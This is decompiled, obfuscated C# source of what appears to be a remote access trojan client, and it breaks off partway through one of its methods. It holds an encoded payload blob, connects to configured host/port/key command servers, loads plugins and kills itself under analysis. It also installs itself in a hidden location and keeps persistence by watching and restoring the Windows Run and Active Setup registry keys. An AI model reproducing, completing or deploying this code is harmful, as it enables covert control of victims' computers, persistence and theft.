using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class10
{
	private const string string_0 = "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9vN5C6fz/fP98/Pz8/P287n0rfMD8//z8/Pz8/bzufTP8wvzAfPz8/Pz9vO59NvzF/MF8/Pz8/P283kLp/P98wbz8/Pz8/bzufSt8wPzCPPz8/Pz9vO59M/zC/MK8/Pz8/P287n02/MX8w7zQxPz8/PzeQun80DzD/NbE/Pz8/OJ86L0TPMP88MT8/Pz84nzrPRT8xDzIhTz8/PzeQun80DzEfPz8/Pz8/O5ALj0WvMR8/Pz8/Pz87kAwfRa8xHz8/Pz8/PzuQDR9FrzEfPz8/Pz8/O5ANz0XvMR8/Pz8/Pz87kA7fRj8xHz8/Pz8/PzuQAF9WPzEfPz8/Pz8/O5ABf1Y/MR8ysU8/Pz83n7I/Vn8xHzQhTz8/Pzefs59WzzEfPz8/Pz8/O5AFf1cvMS8/Pz8/Pz87kAffV38xLzSxTz8/PzefuL9XzzEvNiFPPz8/N5+5v1gPMS82sU8/Pz83n7q/WF8xPz8/Pz8/Pzufi09UDzE/Pz8/Pz8/O5+L/1ivMT88EU8/Pz87n0x/WA8xXzxxTz8/Pzefvr9ZXzFvMDFfPz8/N5+wH2lfMX8z8V8/Pz83n7IvaV8xjzexXz8/Pzefsu9pXzGfO3FfPz8/N5+0X2lfMa8/MW8/Pz83n7UfaV8xvzLxbz8/Pzeftm9p/zHPNrFvPz8/N5+3D2n/Md86cW8/Pz83n7hPap8x7z4xbz8/PzefuP9qnzH/MfF/Pz8/N5+6b2s/Mg81sX8/Pz83n7s/az8yHzlxfz8/PzefPD9rnzIvPnF/Pz8/N588j2bPMk8xMY8/Pz83nz0/ZA8yXzPxjz8/PzdPPc9kDzJfOTGPPz8/N3C6fzQPMl8/Pz9POV9/Pz9fOc9/Pz9POj9/Pz9fPc9vPz9POj9/Pz9fPc9vPz9vOq9/Pz9/OV9/Pz9POz9/Pz9POV9/Pz9fOc9/Pz9POj9/Pz9fPc9vPz9POj9/Pz9fPc9vPz9vOq9/Pz9/OV9/Pz9POz9/Pz9POV9/Pz9fOc9/Pz9POj9/Pz9fPc9vPz9POj9/Pz9fPc9vPz9vOq9/Pz9/OV9/Pz9POz9/Pz9PO69/Pz9PO/9/Pz9PPB9/Pz9PPB9/Pz9PPH9/Pz9fPc9vPz9PPH9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPB9/Pz9PPT9/Pz9fPc9vPz9PPc9lzzp/Pt82Tzp/Pt82zzp/Pt83Tzp/Pt83zzp/Pt84Tzp/Pt84zzp/Pt85Tzp/Pt85zzp/Py86Tzp/Pt86zzp/Pt87Tzp/Pt87zzp/P39Mzzp/P99NTzp/NA89zzp/NA8wzzp/NA8//zp/NA8zzzp/NA8zTzp/NA8zTzovQI9OTz5vlA8zzz7PkP9OTz9PpA8zzzp/Mb9DTzrPQh9Ozzp/NA8wzzHPo39Pz0Lfo99PT0S/pG9Pz0XfpP9KTzcfpa8yTzp/Pt8yTze/o18wz0ivpg9BT0r/ps9Az0v/pg9FTzrfO/9Pvz+/Mk8/vz//Mp8/vzB/Mk8/vzC/Mp8yHzFvP09SHzbvNp9SHzJvMB9SHzZvNg9SHz/vPH9CHzBvPT9CHzDvPu9CHzHvPH9CHzLvPu9CHzPvPu9CHzRvMg9SHzVvNK9SHzXvNX9TT1zvMp81T1zvMp8/P2zvMp8xP2zvMp83P2zvMp85P2zvMp8xT0J/Qu9DP0WPR+9I30nPSr9LX0u/T88/Tz8/PZ9STz8/Ma9iTz8/M99iTz8/Ng9v/z8/N99vvz8/Od9gPz/PP08/PzHvfI8/PzI/fI8/PzL/fI8/PzNvfM8/PzQ/fR8/PzV/fR8/PzZffR8/PzbffV8/PzT/Xa8/Pzf/ff8/Pziffk8/PzD/To8wPzFvP18/vzFfP18/XzBPP28wPzGPP38/vzF/P38/XzBfP48/vzGfP58wPzGvP58/XzBvP68wPzHPP78/vzG/P78/XzB/P88wPzHvP98/vzHfP98/XzCPP+8wPzIPP/8/vzH/P/8/XzCfMA8/XzCvMC8/XzC/ME8/TzDPME8/XzDfMG8/XzDvMI8/TzEPMK8/XzD/MK8/XzEfMM8wL093Pz8/Tz8/Pz8/Pz8/Pz8/PzcfPz8/Xz8/Pz8/Pz8/Pz8/TzefPz8/Pz9fPz8/Pz8/Pz8/Pz9PNj9fPz8/M883n0PPOI9Dzzl/Q886b08/PzL0BiV2hfWDHzPENfaFpcYSFXX1/zQmhnY2hnOGlYYWc7VGFXX1hl80NfaFpcYfM8YWNoZzhpWGFnO1RhV19YZfNFWFZYXGlYVzhpWGFnO1RhV19YZfNDX2haXGFGZ1RnWPNGXFdY80NfaFpcYTRlWmbzRlhlXFRfXG1YZfM8Q19oWlxh82BmVmJlX1xV80ZsZmdYYPNAaF9nXFZUZmc3WF9YWlRnWPM4YWhg80JVXVhWZ/MhVmdiZfM8YWliXljzPDRmbGFWRVhmaF9n8zRmbGFWNlRfX1VUVl7zNVhaXGE8YWliXljz80Nz9jhhVzxhaWJeWPNpVF9oWFJS80FCQTjzRUhBQTxBOvM2Pzw4QUfzRjhFSThF8ztYVFdYZfM6aFxX80NfaFpcYTpoXFfzRmxmZ1hgITZiX19YVmdcYmFmITpYYVhlXFbzP1xmZ1Mk8zdUZ1TzRmxmZ1hgIUVoYWdcYFghRlhlXFRfXG1UZ1xiYSE5YmVgVGdnWGVmITVcYVRlbPM1XGFUZWw5YmVgVGdnWGXzVVnzRmxmZ1hgITxC80BYYGJlbEZnZVhUYPNgZvNGWGVcVF9cbVjzN1hmWGVcVF9cbVjzWlhnUkFUYFjzWlhnUjdYZlZlXGNnXGJh81pYZ1I0aGdbYmXzWlhnUjZoZWVYYWdGZ1RnWPNaWGdSRmdiY0JhN1xmVmJhYVhWZ1xiYfNaWGdSOGtYVmhnWEJhP2JUV/NaWGdSO1RmOWJlYPNaWGdSOGtYVmhnWEJhP2JUVzRlWmbzZlhnUjhrWFZoZ1hCYT9iVFc0ZVpm80lYZWZcYmHzWlhnUklYZWZcYmHzRmxmZ1hgIUpcYVdiamYhOWJlYGbzOWJlYPNaWGdSPGFjaGc5YmVg81pYZ1JGZ1RnWEJVXVhWZ/NmWGdSRmdUZ1hCVV1YVmfzWlhnUjpoXFfzPGFcZ1xUX1xtWPM4a1hWaGdY80ZnYmPzOGlYYWc7VGFXX1hl8zhrWFZoZ1xiYTZiYGNfWGdY81RXV1I4a1hWaGdcYmE2YmBjX1hnWPNlWGBiaVhSOGtYVmhnXGJhNmJgY19YZ1jzRmdUZWdYV/NUV1dSRmdUZWdYV/NlWGBiaVhSRmdUZWdYV/NGZ2JjY1hX81RXV1JGZ2JjY1hX82VYYGJpWFJGZ2JjY1hX8zxhY2hn81RXV1I8YWNoZ/NlWGBiaVhSPGFjaGfzQmhnY2hn81RXV1JCaGdjaGfzZVhgYmlYUkJoZ2NoZ/NFWFZYXGlYV/NUV1dSRVhWWFxpWFfzZVhgYmlYUkVYVlhcaVhX80ZYYVfzQmFFWFZYXGlYV/M4a1hWaGdYV/NY8y84a1hWaGdYQmE/YlRXNGVaZjFeUlI1VFZeXGFaOVxYX1fzL0ZnVGdYQlVdWFZnMV5SUjVUVl5cYVo5XFhfV/NBVGBY8zdYZlZlXGNnXGJh8zRoZ1tiZfM2aGVlWGFnRmdUZ1jzRmdiY0JhN1xmVmJhYVhWZ1xiYfM4a1hWaGdYQmE/YlRX8ztUZjliZWDzOGtYVmhnWEJhP2JUVzRlWmbzPGFjaGc5YmVg80ZnVGdYQlVdWFZn82JVXVhWZ/NgWGdbYlfzZlhhV1hl81ZUX19VVFZe82VYZmhfZ/NUZVpm81XzaVRfaFjzZmdUZ1hCVV1YVmfzZlxXWPNGbGZnWGAhRVhZX1hWZ1xiYfM0ZmZYYFVfbEdcZ19YNGdnZVxVaGdY8zRmZlhgVV9sN1hmVmVcY2dcYmE0Z2dlXFVoZ1jzNGZmWGBVX2w2YmFZXFpoZVRnXGJhNGdnZVxVaGdY8zRmZlhgVV9sNmJgY1RhbDRnZ2VcVWhnWPM0ZmZYYFVfbENlYldoVmc0Z2dlXFVoZ1jzNGZmWGBVX2w2YmNsZVxaW2c0Z2dlXFVoZ1jzNGZmWGBVX2xHZVRXWGBUZV40Z2dlXFVoZ1jzNGZmWGBVX2w2aF9naGVYNGdnZVxVaGdY80ZsZmdYYCFFaGFnXGBYITxhZ1hlYmNGWGVpXFZYZvM2YmBJXGZcVV9YNGdnZVxVaGdY8zpoXFc0Z2dlXFVoZ1jzNGZmWGBVX2xJWGVmXGJhNGdnZVxVaGdY8zRmZlhgVV9sOVxfWElYZWZcYmE0Z2dlXFVoZ1jzRmxmZ1hgITdcVFphYmZnXFZm8zdYVWhaWlRVX1g0Z2dlXFVoZ1jzN1hVaFpaXGFaQGJXWGbzRmxmZ1hgIUVoYWdcYFghNmJgY1xfWGVGWGVpXFZYZvM2YmBjXF9UZ1xiYUVYX1RrVGdcYmFmNGdnZVxVaGdY80VoYWdcYFg2YmBjVGdcVVxfXGdsNGdnZVxVaGdY80ZYZVxUX1xtVFVfWDRnZ2VcVWhnWPNGZ2VYVGDzNl9iZljzR2I0ZWVUbPM3XGZjYmZY8zZiYGNcX1hlOlhhWGVUZ1hXNGdnZVxVaGdY80dsY1jzOlhnR2xjWPM0ZmZYYFVfbPM6WGc0ZmZYYFVfbPNFaGFnXGBYR2xjWDtUYVdfWPM6WGdHbGNYOWViYDtUYVdfWPM6WGc2aGZnYmA0Z2dlXFVoZ1hm81pYZ1JJVF9oWPM4YGNnbPM3WF9YWlRnWPM2YmBVXGFY80ZsZmdYYCFHW2VYVFdcYVrzPGFnWGVfYlZeWFfzNmJgY1RlWDhrVltUYVpY80VYYGJpWPM4aVhhZzRlWmbz8/Pz8/YT8/Pz8/PHEKLXQcOdNIsSnhdbICk18/uqbU9JDCfTfPgT9fQPC/oT9fQFFwUP/hP3BQQFFwUPBQgP+BP09AUE9fn79vkEB/fz8/Pz9/Tz8/P2+QQL9fkB9vkEDPn5CAUQ9A/2E/P09vkFFPb5BRj58/QQ+AUP+fP0BQ8Q+PYT8wH3E/MEB/YT8/X3E/MFD/gT9PQFD/cT8wUc9xPzBSD2E/MP9xP09A/3E/MEDPkT9fQPBQ/2+QUk+BP09AUk9vkF//gT9PQF//b5Bfv4E/T0Bfv2+QUD+BP09AUD+hP19AQLBQ/2+QUP9fkP9hvzAfcb8wQH9hvz9fcb8wUP9xvzBRz3G/MFIPYb8w/3G/MEDPcT9PQB9xP09PX4E/T0BFz3E/T0+/gIBRD0D/kT9fQFbA/3E/MQ+Pn69RD4EPj4E/T0EPj4E/QPBWz5+vUFDwUP9/r0BQ/2+vQP+BPzBXN0+/P0BXN4BXN0+/P0BXN0BHN8+xP1EA8Fc3T1+vr2EA8EDPX+8/UFc4AFc4AFc4D/A/T2EfMDEfMR8xHz9/30BST8+vcFJAUkBST19/30Bf/8+vcF/wX/Bf/19/30Bfv8+vcF+wX7Bfv19/30BQP8+vcFAwUDBQP1+Pr1BAv19vr09foT9fQPBXOI/vTz+UNfaFpcYfPzDfTzCEFYZyBKWFRpWBNDX2haXGETNVRmWPPz+PTz8/Pz//Tz+mtGXF9YYWfz8xH08ww2YmNsZVxaW2cTtZwTa0ZcX1hhZxMlIyQk8/Mc9PMXKiYpVCdYIyggVlUsWCAnVShZICxXVyggJVRWKSxYWVYjVyws8/P/9PP6JCEjISMhI/Pz+/Tz+vTz8/Pz+/Tz+/Pz8/PzEfTz9PNH9QlKZVRjQWJhOGtWWGNnXGJhR1tlYmpm9PPz8/Pz8/MuwX9B8/Pz8/Xz8/Nt8/Pztyzz87cO8/NFRjdGY2p7se1f80B2pwD+Vx1mpPXz8/M2LU9IZlhlZk9BVGdbVGFPN2JWaGBYYWdmT0lcZmhUXxNGZ2hXXGITJSMkI09DZWJdWFZnZk9DZWJdWFZnEzc3YkZYZU9DX2haXGFPYlVdTzdYVWhaTzxDX2haXGEhY1dV8/PzWy3z8/Pz8/Pz8/PzcS3z8/MT8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz82Mt8/Pz8/Pz8/NSNmJlN19fQFRcYfNgZlZiZVhYIVdfX/Pz8/Pz8hjzEzPz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz9PMD8/PzC/Pzc/Pz8/Pz8/Pz8/Pz8/Pz9PP08/PzI/Pzc/Pz8/Pz8/Pz8/Pz8/Pz9PPz8/PzO/Pz80sz8/MX9vPz8/Pz8/Pz8/MX9ifz8/NJ80bzUvNJ8zjzRfNG8zzzQvNB81LzPPNB8znzQvPz8/PzsPfi8fPz9PPz8/Tz8/Pz8/Pz9PPz8/PzMvPz8/Pz8/P38/Pz9fPz8/Pz8/Pz8/Pz8/Pz8zfz8/P080nzVPNl8znzXPNf81jzPPNh81nzYvPz8/PzF/P38/PzR/Nl81TzYfNm81/zVPNn81zzYvNh8/Pz8/Pz86P3d/Xz8/TzRvNn82XzXPNh81rzOfNc81/zWPM882HzWfNi8/PzU/Xz8/TzI/Mj8yPzI/Mj8yfzVfMj8/PzN/MJ8/TzNvNi82DzYPNY82HzZ/Nm8/PzQfNY82fzIPNK81jzVPNp81jzE/ND81/zaPNa81zzYfMT8zXzVPNm81jz8/Mj8/vz9PM282LzYPNj81TzYfNs80HzVPNg81jz8/Pz82vzRvNc81/zWPNh82fz8/Mr8/rz9PM581zzX/NY8zfzWPNm81bzZfNc82PzZ/Nc82LzYfPz8/PzQ/Nf82jzWvNc82Hz8/Pz8yPz+/P08znzXPNf81jzSfNY82XzZvNc82LzYfPz8/PzJPMh8yPzIfMj8yHzI/Pz8yvz//P08zzzYfNn81jzZfNh81TzX/NB81TzYPNY8/PzPPND81/zaPNa81zzYfMh81fzX/Nf8/PzS/MM8/TzP/NY81rzVPNf8zbzYvNj82zzZfNc81rzW/Nn8/PzNvNi82PzbPNl81zzWvNb82fzE/Oc8xPza/NG81zzX/NY82HzZ/MT8yXzI/Mk8yTz8/Pz8zPz//P080LzZfNc81rzXPNh81TzX/M581zzX/NY82HzVPNg81jz8/M880PzX/No81rzXPNh8yHzV/Nf81/z8/Mj8/rz9PND82XzYvNX82jzVvNn80HzVPNg81jz8/Pz80PzX/No81rzXPNh8/Pz8/Mn8/vz9PND82XzYvNX82jzVvNn80nzWPNl82bzXPNi82Hz8/Mk8yHzI/Mh8yPzIfMj8/PzK/P78/TzNPNm82bzWPNg81XzX/Ns8xPzSfNY82XzZvNc82LzYfPz8yTzIfMj8yHzI/Mh8yPz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/PzI/Pz//Pz84Mt8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8w==";

	private static List<GClass2> list_0;

	private static List<Class3> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class8.bool_13 && (!Class8.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class8.string_1, Class0.smethod_3(Class8.string_2, bool_0: true)))))
		{
			Class1.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class11.smethod_0(Class8.string_6);
		if (Class11.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class0.smethod_3(Class8.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class3>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class3 @class = new Class3(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class0.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Disconnected += smethod_10;
				@class.ConnectionAccepted += smethod_9;
				@class.Received += smethod_8;
				@class.Sent += smethod_11;
				list_1.Add(@class);
			}
		}
		GClass0.smethod_0();
		GClass1.PluginAdded += smethod_5;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		if (Class8.bool_0 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class8.string_1, Class0.smethod_3(Class8.string_2, bool_0: true)))
		{
			new Thread(Class12.smethod_0).Start();
		}
		if (Class8.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class8.string_1, Class0.smethod_3(Class8.string_2, bool_0: true)))
		{
			GClass0.smethod_3();
		}
		if (Class8.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class8.string_1, Class0.smethod_3(Class8.string_2, bool_0: true)))
		{
			GClass1.smethod_1();
		}
		else
		{
			GClass1.smethod_2();
		}
		if (Class8.bool_0)
		{
			list_0 = new List<GClass2>();
			GClass2 gClass = new GClass2(Class8.registryHive_0, Class8.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.RegChanged += smethod_2;
			if (Class8.bool_12)
			{
				if (Class8.bool_1)
				{
					GClass2 gClass2 = new GClass2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass2.RegChanged += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class8.bool_2)
				{
					GClass2 gClass3 = new GClass2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass3.RegChanged += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class8.bool_3)
				{
					GClass2 gClass4 = new GClass2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components");
					gClass4.RegChanged += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class8.string_11 = smethod_21(smethod_20() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class3 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass2 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class13.smethod_2();
		if (Class8.bool_4)
		{
			smethod_18();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass1.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class12.smethod_2;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
